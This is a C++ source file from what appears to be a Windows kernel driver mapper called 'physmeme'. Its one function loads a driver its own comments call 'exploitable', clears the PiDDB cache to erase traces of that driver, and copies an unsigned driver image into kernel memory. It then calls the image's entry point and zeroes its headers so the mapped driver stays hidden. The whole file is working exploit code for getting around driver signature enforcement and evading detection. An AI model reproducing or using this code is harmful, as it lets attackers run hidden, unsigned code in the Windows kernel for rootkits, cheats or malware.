#include "kernel_ctx/kernel_ctx.h"
#include "drv_image/drv_image.h"

namespace physmeme
{
	NTSTATUS __cdecl map_driver(std::vector<std::uint8_t>& raw_driver)
	{
		physmeme::drv_image image(raw_driver);

		//
		// load exploitable driver
		//
		if (!physmeme::load_drv())
			return STATUS_ABANDONED;

		physmeme::kernel_ctx ctx;

		//
		// shoot the tires off piddb cache.
		//
		const auto drv_timestamp = util::get_file_header(raw_driver.data())->TimeDateStamp;
		if (!ctx.clear_piddb_cache(physmeme::drv_key, drv_timestamp))
			return STATUS_ABANDONED;

		//
		// lambdas used for fixing driver image
		//
		const auto _get_module = [&](std::string_view name)
		{
			return util::get_module_base(name.data());
		};

		const auto _get_export_name = [&](const char* base, const char* name)
		{
			return reinterpret_cast<std::uintptr_t>(util::get_kernel_export(base, name));
		};

		//
		// fix the driver image
		//
		image.fix_imports(_get_module, _get_export_name);
		image.map();

		//
		// allocate memory in the kernel for the driver
		//
		const auto pool_base = 
			ctx.allocate_pool(
				image.size(),
				NonPagedPool
			);

		image.relocate(pool_base);

		//
		// copy driver into the kernel
		//
		ctx.write_kernel(pool_base, image.data(), image.size());

		//
		// driver entry
		//
		auto entry_point = reinterpret_cast<std::uintptr_t>(pool_base) + image.entry_point();

		//
		// call driver entry
		//
		auto result = ctx.syscall<DRIVER_INITIALIZE>(
			reinterpret_cast<void*>(entry_point),
			reinterpret_cast<std::uintptr_t>(pool_base),
			image.size()
		);

		//
		// zero driver headers
		//
		ctx.zero_kernel_memory(pool_base, image.header_size());

		physmeme::unmap_all();
		if (!physmeme::unload_drv())
			return STATUS_ABANDONED;

		return result;
	}

	NTSTATUS __cdecl map_driver(std::uint8_t * image, std::size_t size)
	{
		std::vector<std::uint8_t> data(image, image + size);
		return map_driver(data);
	}
}